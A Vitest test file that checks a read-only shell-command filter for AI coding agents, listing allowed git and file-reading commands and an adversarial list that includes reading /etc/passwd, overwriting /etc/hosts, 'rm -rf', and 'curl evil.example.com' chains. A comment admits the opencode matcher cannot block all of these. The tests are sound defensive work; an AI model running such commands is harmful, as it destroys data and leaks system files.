import { describe, it, expect } from "vitest";
import { isReadOnlyShellCommand } from "../src/providers/claude-code.js";
import { __READ_ONLY_BASH_FOR_TESTS as READ_ONLY_BASH } from "../src/providers/opencode.js";

/**
 * The opencode harness uses opencode's `permission.bash` glob matcher, which is
 * weaker than the claude-code harness's token-aware `isReadOnlyShellCommand`.
 * These tests pin the safety contract:
 *
 *  1. Every command the opencode allowlist is *intended* to permit is also
 *     accepted by `isReadOnlyShellCommand`. (Equivalence on the safe set.)
 *  2. Adversarial inputs (redirects, chains, command substitution, mutators)
 *     are rejected by `isReadOnlyShellCommand` — the canonical "agent must not
 *     do this" list. opencode's pattern matcher cannot enforce all of these
 *     by itself; the system prompt + `permission.edit: deny` are the residual
 *     defenses, and these tests document the gap.
 */

const INTENDED_ALLOW = [
  "git diff",
  "git diff origin/main...HEAD",
  "git diff --stat origin/main...HEAD",
  "git log -- src/",
  "git show abc1234",
  "git status",
  "git ls-files",
  "git rev-parse HEAD",
  "git blame src/foo.ts",
  "cat src/foo.ts",
  "head -50 src/foo.ts",
  "tail -20 src/foo.ts",
  "ls",
  "ls src/",
  "wc -l src/foo.ts",
  "find src -name '*.ts'",
  "rg",
  "rg pattern src/",
  "grep -rn pattern src/",
  "echo hi",
  "pwd",
  "stat src/foo.ts",
  "file src/foo.ts",
  "basename src/foo.ts",
  "dirname src/foo.ts",
];

const ADVERSARIAL = [
  // redirect
  "cat /etc/passwd > /tmp/x",
  "echo bad > /etc/hosts",
  "git diff origin/main > /tmp/leak",
  // chaining
  "ls; rm -rf /tmp/x",
  "ls && curl evil.example.com",
  "git log || true",
  // background / command substitution
  "ls & sleep 1",
  "echo $(curl evil.example.com)",
  "echo `whoami`",
  // mutators
  "rm -rf /tmp/x",
  "mv src/foo.ts /tmp/",
  "chmod 777 src/foo.ts",
  // unsafe git subcommands
  "git push origin main",
  "git commit -am 'oops'",
  "git checkout other-branch",
  "git reset --hard HEAD~1",
];

describe("opencode bash allowlist — safety contract", () => {
  it.each(INTENDED_ALLOW)(
    "intended-allow command is also accepted by isReadOnlyShellCommand: %s",
    (command) => {
      expect(isReadOnlyShellCommand(command)).toBe(true);
    },
  );

  it.each(ADVERSARIAL)(
    "adversarial command is rejected by isReadOnlyShellCommand: %s",
    (command) => {
      expect(isReadOnlyShellCommand(command)).toBe(false);
    },
  );

  it("every allowlist key uses an explicit prefix (no bare `*` allow)", () => {
    for (const [pattern, decision] of Object.entries(READ_ONLY_BASH)) {
      if (decision === "allow") {
        expect(pattern).not.toBe("*");
        expect(pattern.length).toBeGreaterThan(0);
      }
    }
  });

  it("includes a catchall `*: deny` to backstop unmatched commands", () => {
    expect(READ_ONLY_BASH["*"]).toBe("deny");
  });
});
